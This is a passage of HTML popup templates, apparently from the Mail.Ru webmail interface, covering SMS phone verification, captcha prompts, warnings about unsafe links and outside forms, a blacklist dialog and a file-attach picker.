						<input class="form__field form__captcha__input" value="" maxlength="16" id="captcha" name="security_image_answer" autocomplete="off" type="text">
						<a href="#" class="form__captcha__link js-refresh-captcha pseudo-link">Не вижу код</a>
						<div class="form__message form__message_error js-captcha-error"></div>
					</div>
				</div>
			</div>

			<div class="js-password form__row" style="display: none;">
				<div class="form__row__label form__row__label_popup">
					<label for="signupsms_password">Текущий пароль</label>
				</div>
				<div class="form__row__widget">
					<input class="form__field" value="" id="signupsms_password" name="password" autocomplete="off" type="password">
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Готово</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
			<a class="popup__link-skipstep nosmslink" href="javascript:void(0);">
				<span class="js-nosmslink-text" data-case="DEFAULT">Не пришло SMS-сообщение?</span>
				<span class="js-nosmslink-text" style="display: none" data-case="PHONE_CODE_ALREADY_SENT">Запросить код еще раз</span>
				<span class="js-nosmslink-text" style="display: none" data-case="PHONE_TOO_MANY_ATTEMPTS">Не пришел код подтверждения?</span>
			</a>
		</div>
	</form>
</div>
		<div class="is-genDelPhone_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Удаление телефонного номера <span class="phone nobr"></span></div>
			<div class="popup__desc popup__desc_messagebox" style="display: none;"></div>
			<div class="form__row">
				<div class="form__row__label form__row__label_popup">
					<label for="genDelPhone_code">Код для удаления</label>
				</div>
				<div class="form__row__widget form__row__widget_popup">
					<input name="code" value="" class="form__field" autocomplete="off" id="genDelPhone_code" type="text">
					<div class="js-error form__message_error"></div>
					<div class="form__row__subwidget"><a href="javascript:void(0);" class="mr-link resendsms"><u>Отправить код еще раз</u></a></div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Готово</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
			<a href="javascript:void(0);" class="popup__link-skipstep nosmslink">Не пришло SMS-сообщение?</a>
		</div>
	</form>
</div>

		<div class="is-genDelPhoneConfirm_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Удаление телефонного номера <span class="phone popup__head__nobreaks"></span></div>
			<div class="popup__desc popup__desc_messagebox">В целях улучшения безопасности вашего почтового ящика, для удаления телефона необходимо ввести код-подтверждение, отправленный в виде SMS-сообщения на данный номер.<br>Если вы не укажете код, телефон будет автоматически удален <b><span class="date"></span></b>.</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Получить код</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
			<a href="javascript:void(0);" class="popup__link-skipstep codeisset">У меня уже есть код</a>
		</div>
	</form>
</div>

		<div class="is-verifyPhoneConfirm_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">
				Подтверждение телефонного номера <span class="phone popup__head__nobreaks"></span>
			</div>
			<div class="popup__desc popup__desc_messagebox">
				Для того, чтобы подтвердить телефонный номер, необходимо ввести специальный код, получив его в сообщении SMS.
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Получить код</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
			<a class="popup__link-skipstep codeisset" href="javascript:void(0);">У меня уже есть код</a>
		</div>
	</form>
</div>

		<div class="is-genDelPhoneSuccess_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Удаление телефонного номера <span class="phone popup__head__nobreaks"></span></div>
			<div class="popup__desc popup__desc_messagebox">Номер телефона успешно удален.</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Закрыть</span></button>
			
		</div>
	</form>
</div>

		<div class="is-signupphone_in" style="display:none;">
	<form action="">
		<input name="back" value="signup" type="hidden">
		<div class="popup__box">
			<div class="popup__head">Введите код на картинке</div>
			<div class="popup__desc">
				<div class="form__row">
					<div class="form__row__subwidget_inline">
						<input name="code" value="" maxlength="16" class="form__field form__captcha__input" autocomplete="off" style="width:100px;" type="text">
						<div class="js-error form__message_error"></div>
					</div>
					<div class="form__row__subwidget_inline">
						<img src="//img.imgsmail.ru/0.gif" class="js-captchaImage" alt="" height="51" width="65">
						<img src="//img.imgsmail.ru/0.gif" class="js-captchaImage" alt="" height="51" width="65">
						<img src="//img.imgsmail.ru/0.gif" class="js-captchaImage" alt="" height="51" width="65">
					</div>
					<div class="form__row__subwidget_inline" style="margin-left:15px;">
						<a href="javascript:void(0);" class="js-captchaReloader">Не вижу код</a>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Готово</span></button>
			
		</div>
	</form>
</div>

		<div class="is-captcha_in" style="display:none;">
	<form action="">
		<input name="back" value="signup" type="hidden">
		<div class="popup__box">
			<div class="popup__head">Введите код на картинке</div>
			<div class="popup__desc">
				<div class="form__row">
					<div class="form__row__subwidget_inline">
						<input name="code" value="" maxlength="16" class="form__field form__captcha__input" autocomplete="off" style="width:100px;" type="text">
						<div class="js-error form__message_error"></div>
					</div>
					<div class="form__row__subwidget_inline">
						<img src="//img.imgsmail.ru/0.gif" class="js-captchaImage" alt="" style="display: block;" height="51" width="151">
					</div>
					<div class="form__row__subwidget_inline" style="margin-left:15px;">
						<a href="javascript:void(0);" class="js-captchaReloader">Не вижу код</a>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Готово</span></button>
			
		</div>
	</form>
</div>

		<div class="is-verification1_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Подтверждение учетной записи</div>
			<div class="popup__desc popup__desc_messagebox js-phone-verify-block" style="margin-bottom:20px;">
				<a href="javascript:void(0);" class="mr-link js-phone-verify-link" style="font-size:16px;"><u>Указать телефон</u></a>
				<div style="margin-top:7px;">Мобильный телефон можно использовать для восстановления пароля и&nbsp;для получений <span class="nobr">SMS-уведомлений</span>.</div>
			</div>

			<div class="popup__desc popup__desc_messagebox">
				<a class="mr-link js-captcha-link" style="font-size:16px; line-height:21px;"><u>Введите код с картинки</u></a>
				<div class="js-captcha-block" style="display: none;">
					<div class="form__row">
						<div class="form__row__label" style="width:103px; padding:0;"></div>
						<div class="form__row__widget">
							<img src="//img.imgsmail.ru/0.gif" alt="" style="display: block;" height="51" width="151">
						</div>
					</div>
					<div class="form__row" style="position:relative;">
						<div class="form__row__subwidget_inline" style="color:#000;">Код с картинки</div>
						<div class="form__row__subwidget_inline" style="margin-left:15px;">
							<input name="code" value="" maxlength="16" class="form__field form__captcha__input" autocomplete="off" style="width:100px;" type="text">
							<div class="js-error form__message_error" style="position:absolute; top:30px; left:100px;"></div>
						</div>
						<div class="form__row__subwidget_inline" style="margin-left:15px;">
							<a href="javascript:void(0);" class="js-captchaReloader">Не вижу код</a>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls js-controls-captcha" style="display: none;">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Подтвердить</span></button>
				<button class="btn btn_stylish js-captcha-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
		<div class="popup__controls js-controls-close">
			
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Закрыть</span></button>
			
		</div>
	</form>
</div>

		<div class="is-newphone1_in" style="display:none;">
	<form action="">
		<input name="form_sign" value="" type="hidden">
		<input name="form_token" value="" type="hidden">
		<div style="display: none;">
			<input class="form__checkbox__checkbox" name="ismobile" value="1" checked="checked" style="display: none;" type="checkbox">
		</div>

		<div class="popup__box">
			<div class="js-defaultText">
				<div class="popup__head">
					Добавление номера телефона
				</div>
				<div class="popup__desc">
					Мобильный телефон можно использовать для восстановления пароля и&nbsp;для получений <span class="nobr">SMS-уведомлений</span>.
				</div>
			</div>
			<div class="js-editpassText" style="display: none;">
				<div class="popup__head">
					Укажите номер мобильного телефона
				</div>
				<div class="popup__desc">
					Это позволит снять блокировку почтового ящика и подтвердить смену пароля. В дальнейшем Вы сможете использовать этот телефон для безопасного восстановления пароля в случае его утери.
				</div>
			</div>
			<div class="popup__fieldset">

				<div class="form__row">
					<div class="form__row__label form__row__label_popup">
						<label for="country_newphone">Страна</label>
					</div>
					<div class="form__row__widget">
						<div style="width: 175px;" class="form__select">
							<div class="form__select__box"><div class="form__select__box__text js-text"></div></div>
							<i class="form__select__arrow"></i>
							<select name="phonecode" id="country_newphone" class="form__select__select">
								<option value="7">Россия</option>
							</select>
						</div>
					</div>
				</div>
				<div class="form__row">
					<div class="form__row__label form__row__label_popup">
						<label for="phone_newphone">Ваш телефон</label>
					</div>
					<div class="form__row__widget form__row__widget_popup">
						<div class="form__phone-prefix">
							<div class="form__phone-prefix__prefix js-phonePrefix" style="background-image: url(//img.imgsmail.ru/mail/ru/images/country_icons/ru.png); ">+7</div>
							<input class="form__field form__phone-prefix__field" value="" id="phone_newphone" name="phone" autocomplete="off" type="text">
						</div>
						<div class="red form__message form__message_error"></div>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Добавить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-selectVerifySomePhone_in" style="display:none;">
	<form action="">
		<input name="form_sign" value="" type="hidden">
		<input name="form_token" value="" type="hidden">
		<div class="popup__box">
			<div class="popup__head">Укажите номер мобильного телефона</div>
			<div class="popup__desc popup__desc_messagebox">Это позволит снять блокировку почтового ящика и подтвердить смену пароля. В дальнейшем Вы сможете использовать этот телефон для безопасного восстановления пароля в случае его утери.</div>
			<div class="form__row">
				<div class="form__row__label form__row__label_popup">
					<label for="verifySomePhone_phone">Ваш телефон</label>
				</div>
				<div class="form__row__widget">
					<div style="width: 175px;" class="form__select js-phone-container">
						<div class="form__select__box"><div class="form__select__box__text js-text"></div></div>
						<i class="form__select__arrow"></i>
						<select name="phone" class="js-phone form__select__select" id="verifySomePhone_phone"></select>
						<div class="js-error form__message form__message_error"></div>
					</div>
					<div class="js-phone-single form__row__widget_text form__emphasis"></div>
					<div class="form__row__subwidget">
						<a href="#" class="js-addPhone">Добавить другой телефон</a>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Получить код</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
			<a href="javascript:void(0);" class="popup__link-skipstep js-codeisset">У меня уже есть код</a>
		</div>
	</form>
</div>

		<div class="is-signupphone1_in" style="display:none;">
	<form action="">
		<input name="form_sign" value="" type="hidden">
		<input name="form_token" value="" type="hidden">
		<input name="ismobile" value="1" checked="checked" style="display:none;" type="checkbox">
		<div class="popup__box">
			<div class="popup__head">Подтверждение учётной записи</div>
			<div class="popup__desc popup__desc_messagebox">Пожалуйста, укажите номер своего мобильного телефона. На этот номер придет SMS-сообщение с кодом подтверждения.</div>
			<div class="popup__fieldset">
				<div class="form__row">
					<div class="form__row__label form__row__label_popup">
						<label for="country_newphone1">Страна</label>
					</div>
					<div class="form__row__widget">
						<div style="width: 175px;" class="form__select">
							<div class="form__select__box"><div class="form__select__box__text js-text"></div></div>
							<i class="form__select__arrow"></i>
							<select name="phonecode" id="country_newphone1" class="form__select__select">
								<option value="7">Россия</option>
							</select>
						</div>
					</div>
				</div>
				<div class="form__row">
					<div class="form__row__label form__row__label_popup">
						<label for="phone_newphone1">Ваш телефон</label>
					</div>
					<div class="form__row__widget form__row__widget_popup">
						<div class="form__phone-prefix">
							<div class="form__phone-prefix__prefix js-phonePrefix" style="background-image: url(//img.imgsmail.ru/mail/ru/images/country_icons/ru.png); ">+7</div>
							<input name="phone" autocomplete="off" value="" class="form__field form__phone-prefix__field" id="phone_newphone1" type="text">
							<div class="js-error form__message form__message_error"></div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Готово</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-signupphone2_in" style="display:none;">
	<form action="">
		<input name="back" value="signup" type="hidden">
		<div class="popup__box">
			<div class="popup__head">Введите код на картинке</div>
			<div class="popup__desc">
				<div class="js-error form__message_error"></div>
				<div class="form__row">
					<div class="form__row__subwidget_inline">
						<input name="code" value="" maxlength="16" class="form__field form__captcha__input" autocomplete="off" style="width:100px;" type="text">
					</div>
					<div class="form__row__subwidget_inline">
						<img src="//img.imgsmail.ru/0.gif" class="js-captchaImage" alt="" style="display: block;" height="100" width="240">
					</div>
					<div class="form__row__subwidget_inline">
						<a href="javascript:void(0);" class="js-captchaReloader">Не вижу код</a>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Готово</span></button>
			
		</div>
	</form>
</div>

		<div class="is-sugnupSuccess_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head" style="color:#009843 !important;">Учетная запись успешно подтверждена</div>
			<div class="popup__desc popup__desc_messagebox">Номер <strong class="phone popup__head__nobreaks"></strong> можно использовать для восстановления пароля или для SMS-уведомлений.</div>
			<div class="popup__desc">
				<div><a href="/cgi-bin/security" target="_blank">Перейти к настройкам безопасности</a></div>
				<div><a href="/cgi-bin/editnotify?mode=2" target="_blank">Перейти к настройкам SMS-уведомлений</a></div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Продолжить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-delete_attach_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Вы уверены?</div>
			<div class="popup__desc">Вы уверены, что хотите удалить файл?</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Продолжить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-enable_text_mode_in" style="display:none;">
	<form action="">
		<div class="popup__box popup__box_messagebox">
			<i class="icon icon_popup popup__icon icon_popup_remove-format"></i>
			<div class="popup__head">Вы уверены?</div>
			<div class="popup__desc">
				Все оформление текста, включая изображения,<br>будет утеряно.
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Продолжить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-submit_empty_message_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Вы уверены?</div>
			<div class="popup__desc">Вы уверены, что хотите отправить пустое письмо?</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Продолжить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-phone_verify_check_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">
				Проверка номера
			</div>
			<div class="popup__desc popup__desc_messagebox">
				<div class="js-loadProgress loadProgress">Загрузка</div>
				<div class="js-error form__message form__message_error"></div>
			</div>
		</div>
		
	</form>
</div>

		<div class="is-nosms1_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Не пришло SMS-сообщение?</div>
			<div class="popup__desc">
				<div class="popup__desc__parag">С момента отправки прошло <strong class="js-time"></strong>. Скорее всего SMS-сообщение придет в ближайшие несколько минут.</div>
				<div class="popup__desc__parag">Сообщение было отправлено на номер <strong class="js-phone"></strong></div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish confirm-return" type="button"><span class="btn__text">Вернуться</span></button>
			

			
		</div>
	</form>
</div>

		<div class="is-nosms2_in" style="display:none;">
	<form action="">

		<div class="popup__box">
			<div class="popup__head">
				Не пришло SMS-сообщение?
			</div>

			<div class="popup__desc">

				<div class="popup__desc__parag js-ivr-visible">C момента отправки прошло <strong>5 минут</strong>. Если к вам не дошла СМС с кодом, вы можете запросить код еще раз или заказать обратный звонок, чтобы робот продиктовал вам код на мобильный телефон
				</div>
				<div class="popup__desc__parag js-no-ivr-visible">
					Если сообщение до сих пор не пришло, Вы можете запросить повторную отправку или зарегистрироваться без телефона.
				</div>

				<div class="popup__desc__parag">
					
					<a href="#" class="btn btn_main btn_stylish js-resend pseudo-link" data-media="sms" cnt_sb="3915567">Отправить код еще раз</a><a href="#" class="btn btn_main btn_stylish js-resend pseudo-link js-ivr-visible" data-media="ivr" cnt_sb="3915596">Заказать обратный звонок</a></div>
					
				<div class="popup__desc__parag">Возможно, вы случайно ввели не тот номер?</div>
			</div>

		</div>

		<div class="popup__controls">
			
				<button class="btn btn_stylish confirm-return" type="button"><span class="btn__text">Вернуться</span></button>
			
			
		</div>

	</form>
</div>

		<div class="is-outer_site_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Вы&nbsp;собираетесь покинуть Mail.Ru и&nbsp;перейти на&nbsp;сторонний сайт по&nbsp;присланной в&nbsp;письме ссылке <a id="is-outer_site-txt" cnt_sb="351249" href="#" target="_blank" class="dB mt10 t12 normal"></a></div>
			<div class="popup__desc">
				<div class="popup__desc__parag">Рекомендуем переходить по&nbsp;ссылкам только от&nbsp;известных отправителей и&nbsp;никогда не&nbsp;вводить пароль от&nbsp;своего почтового ящика на&nbsp;сторонних сайтах!</div>
				<div class="form__checkbox">
					<label>
						<input value="1" id="NoForeignConfirm" name="NoForeignConfirm" class="form__checkbox__checkbox" type="checkbox">
						<span class="form__checkbox__label">Не предупреждать меня при переходе на сторонние сайты</span>
					</label>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Перейти на сайт</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-fishing_site_in" style="display:none;">
	<form action="">
		<div class="popup__box popup__box_messagebox">
			<i class="icon icon_popup popup__icon icon_popup_warning"></i>
			<div class="popup__head">Ссылка, по&nbsp;которой вы&nbsp;хотите перейти, возможно, небезопасна</div>
			<div class="popup__desc">
				<div class="popup__desc__parag">Ссылка <span id="is-fishing_site-txt"></span> может нанести вред вашему компьютеру и&nbsp;привести к&nbsp;взлому почтового ящика.</div>
				<div class="popup__desc__parag popup__desc__parag_select">Я&nbsp;понимаю опасность и&nbsp;беру на&nbsp;себя всю ответственность, но&nbsp;все равно хочу перейти на&nbsp;<a href="#" class="fishing-link" cnt_sb="351250" target="_blank">указанный сайт</a>.</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-cancel" type="button"><span class="btn__text">Вернуться в почту</span></button>
			
			<a href="//help.mail.ru/mail-help/security/internet" target="_blank" class="popup__link-skipstep">Защита почтового ящика</a>
		</div>
	</form>
</div>

		<div class="is-wotfishing_site_in" style="display:none;">
	<form action="">
		<div class="popup__box popup__box_messagebox">
			<i class="icon icon_popup icon_popup_warning popup__icon"></i>
			<div class="popup__head">Сайт, который вы&nbsp;хотите посетить, возможно, небезопасен</div>
			<div class="popup__desc">
				<div class="popup__desc__parag">
					<a href="http://wot.mail.ru/" cnt_d="484811" target="_blank" class="js-wotlink"><img class="popup__desc__image" src="//img.imgsmail.ru/r/default/popup/promo/wot/wot_logo.png" alt=""></a>
					
						По&nbsp;оценкам пользователей Web of&nbsp;Trust этот сайт может нанести вред вашему компьютеру. Узнать подробнее об&nbsp;оценке этого сайта и&nbsp;безопасной работе в&nbsp;интернете можно на&nbsp;сайте <a href="http://wot.mail.ru/" cnt_d="484811" target="_blank" class="js-wotlink">wot.mail.ru</a>
					
				</div>
				<div class="popup__desc__parag popup__desc__parag_select">Я&nbsp;понимаю опасность и&nbsp;беру на&nbsp;себя всю ответственность, но&nbsp;все равно хочу перейти на&nbsp;<a href="#" class="fishing-link" cnt_sb="484803" target="_blank">указанный сайт</a>.</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_main btn_stylish confirm-cancel"><span class="btn__text">Вернуться в почту</span></button>
			
			<a href="//help.mail.ru/mail-help/security/internet" target="_blank" class="popup__link-skipstep">Защита почтового ящика</a>
		</div>
	</form>
</div>

		<div class="is-outer_form_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Вы собираетесь отправить данные из формы на сторонний сайт.</div>
			<div class="popup__desc">
				<div class="popup__desc__parag"><a id="is-outer_form-txt" href="#" target="_blank" class="normal"></a></div>
				<div class="popup__desc__parag">Рекомендуем вам отправлять формы только на известные вам сайты. Никогда не указывайте в них пароли и персональные данные.</div>
				<div class="form__checkbox">
					<label>
						<input value="1" id="iufi-NFC" name="NoForeignConfirm" class="form__checkbox__checkbox" type="checkbox">
						<span class="form__checkbox__label">Не предупреждать меня при переходе на сторонние сайты</span>
					</label>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Отправить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-fishing_form_in" style="display:none;">
	<form action="">
		<div class="popup__box popup__box_messagebox">
			<i class="icon icon_popup popup__icon icon_popup_warning"></i>
			<div class="popup__head">Вы&nbsp;пытаетесь отправить данные на&nbsp;возможно небезопасный сайт</div>
			<div class="popup__desc">
				<div class="popup__desc__parag">
					Форма, которую вы&nbsp;заполнили, отправляет данные на&nbsp;сайт <span id="is-fishing_form-txt"></span>, который может нанести вред вашему компьютеру, стать причиной взлома почтового ящика или краже ваших персональных данных.
				</div>
				<div class="popup__desc__parag popup__desc__parag_select">Я&nbsp;понимаю опасность и&nbsp;беру на&nbsp;себя всю ответственность, но&nbsp;все равно хочу отправить данные на&nbsp;указанный сайт.</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-cancel" type="button"><span class="btn__text">Не отправлять</span></button>
				<button class="btn btn_stylish confirm-ok" type="button"><span class="btn__text">Отправить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-to_black_list_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Добавить в «черный список»</div>
			<div class="popup__desc">
				<div class="popup__desc__parag">Вы уверены, что хотите добавить адрес <strong class="email"></strong> в «черный список» и больше не получать от него письма?</div>
				<div class="form__checkbox form__checkbox_next-bottom-checkbox">
					<label for="to_black_list_mode1">
						<input id="to_black_list_mode1" name="to_black_list_mode" value="1" class="form__checkbox__checkbox" checked="" type="radio">
						добавить, но не удалять письма от адресата
					</label>
				</div>
				<div class="form__checkbox form__checkbox_next-bottom-checkbox">
					<label for="to_black_list_mode2">
						<input id="to_black_list_mode2" name="to_black_list_mode" value="2" class="form__checkbox__checkbox" type="radio">
						добавить и удалить текущее письмо
					</label>
				</div>
				<div class="form__checkbox form__checkbox_next-bottom-checkbox">
					<label for="to_black_list_mode3">
						<input id="to_black_list_mode3" name="to_black_list_mode" value="3" class="form__checkbox__checkbox" type="radio">
						добавить и удалить все письма от адресата<br>(может занять несколько минут)
					</label>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			<div class="controls">
				
					<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Добавить в черный список</span></button>
					<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
				
			</div>
			<div class="progress" style="display: none;">
				<div class="inLoading_E6E8ED popup__link-skipstep" style="line-height: normal; color:#999999; font-weight:bold;">идет поиск писем…</div>
			</div>
		</div>
	</form>
</div>

		<div class="is-file_size_error_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Ошибка</div>
			<div class="popup__desc">
				Общий размер загружаемых вами файлов превышает разрешенные для данного способа загрузки 30 МБ. Чтобы прикрепить файлы большего объема, пожалуйста, используйте кнопку «Прикрепить».
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Продолжить</span></button>
			
		</div>
	</form>
</div>

		
		





	
	
	



<div class="is-changeAccount_in" style="display:none;">
	<form action="https://auth.mail.ru/cgi-bin/auth" method="post" name="Auth">
		<input name="Login" value="" style="display: none;" class="js-field-login" type="text">
		<input name="page" value="" class="js-field-page" type="hidden">
		<div class="popup__box">
			<div class="popup__head ">Войти в почту&nbsp;<span class="js-oldEmail"></span></div>
			<div class="popup__desc popup__desc_messagebox">Для продолжения работы с почтой, введите пароль</div>
			<div class="form__row">
				<div class="form__row__label form__row__label_popup">
					<label>Пароль</label>
				</div>
				<div class="form__row__widget form__row__widget_popup">
					<input name="Password" class="form__field" type="password">
					<div class="form__row__subwidget">
						<a href="/cgi-bin/passremind" class="mr-link"><u>Забыли пароль?</u></a>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Войти в почту</span></button>
			
			<a href="/messages/inbox" class="popup__link-skipstep">Перейти к <span class="js-newEmail"></span></a>
		</div>
	</form>
</div>

		<div class="is-multiAttachToCompose_in" style="display: none;">
	<form action="" method="post">
		<div class="popup__box">
			<div class="js-header popup__head"></div>
			<div class="popup__desc">
				<div class="filesearch__popup__controls">
					<div class="filesearch__popup__field__box">

						<div class="js-search filesearch__popup__searchbox" style="display: none;">
							<div class="filesearch__popup__button__box">
								<input value="Найти" class="form__button form__button_submit js-search-button" type="submit">
							</div>
							<div class="filesearch__popup__label__box">
								<div class="compose__header__row compose__header__row_field">
									<div class="compose__header__label__box">
										<div class="dropdown js-dropdown-select-type">
											<div class="dropdown__button">
												<span class="dropdown__button__text">Все типы</span>
												<i class="dropdown__arrow"><i class="dropdown__arrow__inner"></i></i>
											</div>
											<div class="dropdown__list" style="display: none;">
												<div class="dropdown__list__item" data-type="1">
													<span class="dropdown__list__item__link">
														<span class="dropdown__list__item__link__text">Фото и картинки</span>
													</span>
												</div>
												<div class="dropdown__list__item" data-type="4">
													<span class="dropdown__list__item__link">
														<span class="dropdown__list__item__link__text">Документы</span>
													</span>
												</div>
												<div class="dropdown__list__item" data-type="2">
													<span class="dropdown__list__item__link">
														<span class="dropdown__list__item__link__text">Музыка</span>
													</span>
												</div>
												<div class="dropdown__list__item" data-type="3">
													<span class="dropdown__list__item__link">
														<span class="dropdown__list__item__link__text">Видео</span>
													</span>
												</div>
												<div class="dropdown__list__item" data-type="0">
													<span class="dropdown__list__item__link">
														<span class="dropdown__list__item__link__text">Другие</span>
													</span>
												</div>
												<div class="dropdown__list__item js-default" data-type="-1">
													<span class="dropdown__list__item__link">
														<span class="dropdown__list__item__link__text">Все типы</span>
													</span>
												</div>
											</div>
										</div>
									</div>
									<div class="compose__header__field__box">
										<input class="compose__header__field js-search-field" type="text">
									</div>
								</div>
							</div>
						</div>

						<div class="filesearch__popup__right">
							<div class="js-filesearch-sort form__select filesearch__popup__sortselect" style="display: none;">
								<div class="form__select__box">
									<div class="form__select__box__text js-text"></div>
								</div>
								<i class="form__select__arrow"></i>
								<select name="sort" class="form__select__select">
									<option value="aname">От А до Я</option>
									<option value="dname">От Я до А</option>
									<option value="dmtime">Сначала новые</option>
									<option value="amtime">Сначала старые</option>
									<option value="dsize">Сначала большие</option>
									<option value="asize">Сначала маленькие</option>
								</select>
							</div>
							<div class="filesearch__popup__switcher__box">
								<span class="js-switcher attachlist__header__mode">
									<span class="attachlist__header__mode__button attachlist__header__mode__button_full"></span><span class="attachlist__header__mode__button attachlist__header__mode__button_short"></span>
								</span>
							</div>
						</div>

					</div>
				</div>
				<div class="js-error form__top-message form__top-message_error form__top-message_small-bottom-shift" style="display: none;">
					<i class="form__top-message__icon icon icon_form icon_form_error"></i>
					<span class="js-error-text"></span>
				</div>
				<div style="min-width: 878px;">

					<div class="js-navigation" style="width: 180px; float: left; overflow: auto; display: none;">
						<div class="js-cloud-navigation toolkit" style="display: none;"></div>
						<div class="js-filesearch-navigation toolkit" style="display: none;"></div>
					</div>

					<div class="js-wrapper filesearch__popup__wrapper" style="margin-left: 180px;padding-left: 15px;border-left: 1px solid #d5d5d5; display: none;">
						<div class="js-list filesearch__popup__list messagelist messagelist_files-search messagelist_media messagelist_files-search_short messagelist_cloud"></div>
						<div class="js-waypoint"></div>

						<div class="popup_attach-to-compose__cloud-promo js-cloud-promo" style="display: none;">
							<div class="popup_attach-to-compose__cloud-promo__wrapper">
								<div class="popup_attach-to-compose__cloud-promo__row popup_attach-to-compose__cloud-promo__row_minimal-height">
									<div class="popup_attach-to-compose__cloud-promo__splash"></div>
								</div>
								<div class="popup_attach-to-compose__cloud-promo__row">
									<div class="popup_attach-to-compose__cloud-promo__cell">
										<div class="popup_attach-to-compose__cloud-promo__description">
											<b>Облако Mail.Ru</b> — это ваш персональный диск в интернете. Надежное хранилище, доступное вам в любой точке мира с компьютера или телефона.
										</div>
									</div>
								</div>
